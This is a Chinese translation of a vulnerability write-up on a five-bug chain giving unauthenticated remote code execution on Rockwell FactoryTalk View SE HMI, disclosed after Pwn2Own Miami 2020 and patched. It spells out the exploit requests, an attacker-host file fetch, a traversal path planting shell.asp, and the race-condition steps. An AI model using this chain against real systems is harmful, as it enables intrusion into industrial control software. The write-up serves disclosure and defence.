> 原文链接: https://www.anquanke.com//post/id/212531 


# Rockwell工控软件的5个组合漏洞导致RCE


                                阅读量   
                                **170374**
                            
                        |
                        
                                                            评论
                                <b>
                                    <a target="_blank">1</a>
                                </b>
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



##### 译文声明

本文是翻译文章，文章原作者zerodayinitiative，文章来源：zerodayinitiative.com
                                <br>原文地址：[https://www.zerodayinitiative.com/blog/2020/7/22/chaining-5-bugs-for-code-execution-on-the-rockwell-factorytalk-hmi-at-pwn2own-miami](https://www.zerodayinitiative.com/blog/2020/7/22/chaining-5-bugs-for-code-execution-on-the-rockwell-factorytalk-hmi-at-pwn2own-miami)

译文仅供参考，具体内容表达以及含义原文为准

[![](https://p2.ssl.qhimg.com/t016f59e0d8ad1f4130.jpg)](https://p2.ssl.qhimg.com/t016f59e0d8ad1f4130.jpg)



## 前言

2020年1月份，S4首次举办了在迈阿密的Pwn2Own比赛，在针对工业控制系统（ICS）产品的比赛中，Pedro Ribeiro和Radek Domanski的团队利用5个组合漏洞，在Rockwell的工控人机交互软件上(FactoryTalk View SE HMI)实现了RCE，并赢得了25,000美元的奖金和25个Pwn积分。现在厂商已经发布补丁，并且提供了writeup,演示视频和Metasploit模块。特别感谢Rockwell为本次比赛提供的虚拟机环境。



## 正文

本篇文章的主要内容是Pedro Ribeiro（[@pedrib1337](https://github.com/pedrib1337)）和Radek Domanski（[@RabbitPro](https://github.com/RabbitPro)）发现的一系列漏洞。这些漏洞已经在一月份ZDI的Pwn2Own迈阿密2020比赛中使用。Rockwell FactoryTalk View SE人机界面（HMI）版本11.00.00.230 中存在上述漏洞。较旧的版本也可能会被利用，但是Rockwell尚未确认。

利用效果：无需身份认证即可在安装IIS的Windows主机上实现远程代码执行。攻击依赖于五个独立漏洞的组合。第一个漏洞是未经身份验证的项目复制请求，第二个漏洞是目录遍历，第三个漏洞是竞争条件。为了在所有目标上实现完全的远程代码执行，还利用了两个信息泄漏漏洞。

本文根据组合漏洞利用的先后顺序，分别详细阐述各个漏洞的细节，然后将他们的组合利用方式通过下面的视频展现出来：

[![](https://p4.ssl.qhimg.com/t01695c89f40519aadb.png)](https://p4.ssl.qhimg.com/t01695c89f40519aadb.png)

(视频地址：[https://youtu.be/PIid0Ql_KmU）](https://youtu.be/PIid0Ql_KmU%EF%BC%89)

### <a class="reference-link" name="%E6%BC%8F%E6%B4%9E%E7%BB%86%E8%8A%82"></a>漏洞细节

FactoryTalk View SE在Microsoft IIS上开放了几个REST请求路径，这些请求路径可以通过远程访问。其中一个路径`/rsviewse/hmi_isapi.dll`，它是一个ISAPI DLL处理程序，主要执行一些处理FactoryTalk项目管理的工作。

由于本文描述的漏洞都是使用纯黑盒的渗透测试方法发现的，所以没有必要对ISAPI DLL二进制程序进行逆向分析。

#### <a class="reference-link" name="%E6%BC%8F%E6%B4%9E1%EF%BC%9A%E6%9C%AA%E7%BB%8F%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E7%9A%84%E9%A1%B9%E7%9B%AE%E5%A4%8D%E5%88%B6%E8%AF%B7%E6%B1%82"></a>漏洞1：未经身份验证的项目复制请求

`hmi_isapi.dll`的一个操作是`StartRemoteProjectCopy`,可以通过`HTTP GET`请求来启动此操作：

```
http：// &lt;TARGET&gt; /rsviewse/hmi_isapi.dllStartRemoteProjectCopy&amp; &lt;PROJECT_NAME&gt;＆&lt;RANDOM_STRING&gt;＆&lt;LHOST&gt;
```

其中：
- &lt;TARGET&gt;指运行FactoryTalk View SE的服务器。
- &lt;PROJECT_NAME&gt;必须是服务器上的现有项目。
- &lt;RANDOM_STRING&gt;可以是任何随机字符串。
- &lt;LHOST&gt;是攻击者的主机IP。
发送这个请求后，如果&lt;TARGET&gt;主机上存在&lt;PROJECT_NAME&gt;，&lt;TARGET&gt;就会向&lt;LHOST&gt;发出`HTTP GET`请求：

```
http：// &lt;LHOST&gt; /rsviewse/hmi_isapi.dll?BackupHMI&amp; &lt;RNA_ADDRESS&gt;＆&lt;PROJECT_NAME&gt;＆1＆1
```

&lt;RNA_ADDRESS&gt;是FactoryTalk View SE使用的内网地址。这与我们的漏洞利用没有关系，因此忽略它。

而且&lt;LHOST&gt;可以完全忽略请求内容，攻击者只需要返回如下响应

```
HTTP/1.1 OK 
(...) 
&lt;FILENAME&gt;
```

收到此响应后，&lt;TARGET&gt;将向&lt;LHOST&gt;发送`HTTP GET`请求：

```
http：// &lt;LHOST&gt; / rsviewse / _bak / &lt;FILENAME&gt;
```

&lt;LHOST&gt;可以向&lt;TARGET&gt;发送文件&lt;FILENAME&gt;，文件内容可以为任意值`&lt;FILE_DATA&gt;`

&lt;TARGET&gt;随后将向地址&lt;FACTORYTALK_HOME&gt;_bak\&lt;FILENAME&gt;写入&lt;FILE_DATA&gt;，然后根据文件内容执行某些操作(由于这些操作和漏洞利用无关，因此没有具体分析)，最后删除&lt;FILENAME&gt;文件。所有这些动作都在不到一秒钟的时间内发生。

&lt;FACTORYTALK_HOME&gt;FactoryTalk View SE 的默认值为C:\Users\Public\Documents\RSView Enterprise。

#### <a class="reference-link" name="%E6%BC%8F%E6%B4%9E2%EF%BC%9A%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86"></a>漏洞2：目录遍历

发现了第一个漏洞之后，下一个目标就是获得远程代码执行。虽然文件名和文件的内容是完全可控的，但是还不能实现远程代码执行。

实现RCE的最简单方法是将带有ASP或ASPX代码的文件写入IIS目录。利用目录遍历漏洞，将&lt;FILENAME&gt;设置为：

```
../SE/HMI项目/shell.asp
```

&lt;TARGET&gt;就会将文件写入&lt;FACTORYTALK_HOME&gt;\SE\HMI Projects\shell.asp。由于这个路径在IIS中配置为虚拟路径，这个ASP文件一旦被访问就会立即执行。

#### <a class="reference-link" name="%E6%BC%8F%E6%B4%9E3%EF%BC%9A%E7%AB%9E%E4%BA%89%E6%9D%A1%E4%BB%B6"></a>漏洞3：竞争条件

上面提到&lt;FILENAME&gt;在被创建的1秒钟之内就会被删除。为了能够执行ASP代码，需要在写入文件后立即对其进行访问。

这是一个典型的竞争条件漏洞，将在下一节中说明利用方式。

#### <a class="reference-link" name="%E6%BC%8F%E6%B4%9E4%E5%92%8C5%EF%BC%9AGetHMIProjects%E5%92%8CGetHMIProjectPaths%E7%9A%84%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F"></a>漏洞4和5：GetHMIProjects和GetHMIProjectPaths的信息泄漏

为了实现可靠的利用，有必要知道&lt;PROJECT_NAME&gt;在FactoryTalk View SE服务器上的路径。这些步骤对于PoC不是必需的，但对于武器化的利用还是必要的。厂商提供的Metasploit模块确实实现了这些步骤。<br>
通过以下请求，攻击者可获得项目列表

```
http：// &lt;TARGET&gt; /rsviewse/hmi_isapi.dll?GetHMIProjects
```

FactoryTalk View SE将响应：

```
&lt;?xml version="1.0"?&gt; 

&lt;!--Generated (Sat Jan 18 04:49:31 2020) by RSView ISAPI Server, Version 11.00.00.230, on Computer: EWS--&gt; 

&lt;HMIProjects&gt; 

    &lt;HMIProject Name="FTViewDemo_HMI" IsWatcom="0" IsWow64="1" /&gt; 

&lt;/HMIProjects&gt;
```

在XML中包含了项目名称，可以在随后的请求中使用它来显示项目的路径：

```
http：// &lt;TARGET&gt; /rsviewse/hmi_isapi.dll?GetHMIProjectPath&amp; &lt;PROJECT_NAME&gt;
```

这个响应将包含项目的完整路径：

```
C：\ Users \ Public \ Documents \ RSView Enterprise \ SE \ HMI Projects \ FTViewDemo_HMI
```

这个返回路径可以用来计算正确的路径穿越值，然后访问ASP文件实现RCE。

### <a class="reference-link" name="%E7%BB%84%E5%90%88%E5%88%A9%E7%94%A8"></a>组合利用

实现RCE的流程：<br>
1-获取服务器上的项目列表。<br>
2-提取项目的实际路径以计算正确的目录遍历路径。<br>
3-启动一个HTTP服务器，该服务器负责响应FactoryTalk的请求。<br>
4-启动一个线程，该线程不断尝试访问恶意创建的ASP文件路径。<br>
5-发出请求触发项目复制。<br>
6-攻击者可以“赢得”竞争条件，并以IIS用户身份执行ASP代码。

### <a class="reference-link" name="Metasploit%E6%A8%A1%E5%9D%97"></a>Metasploit模块

对那些想测试自己系统的用户，我们提供了可以利用的Metasploit模块。利用完整步骤可以在上面的视频中看到实际操作。可以在[此处](https://github.com/thezdi/PoC/blob/master/CVE-2020-12027/rockwell_factorytalkse_rce.rb)访问该模块。



## 结论

我们希望您喜欢我们在Pwn2Own 迈阿密中的有关漏洞的writeup。罗克韦尔（Rockwell）在今年6月下旬修复了这些漏洞，并分配了漏洞编号CVE-2020-12027，CVE-2020-12028和CVE-2020-12029。但是安全公告似乎已移至需要登录才能阅读的位置。您需要创建一个帐户来访问其安全公告。该帐户是免费创建的。如果您是罗克韦尔的客户，我们强烈建议您与售后支持联系，以确保您部署了最新版本的FactoryTalk View SE
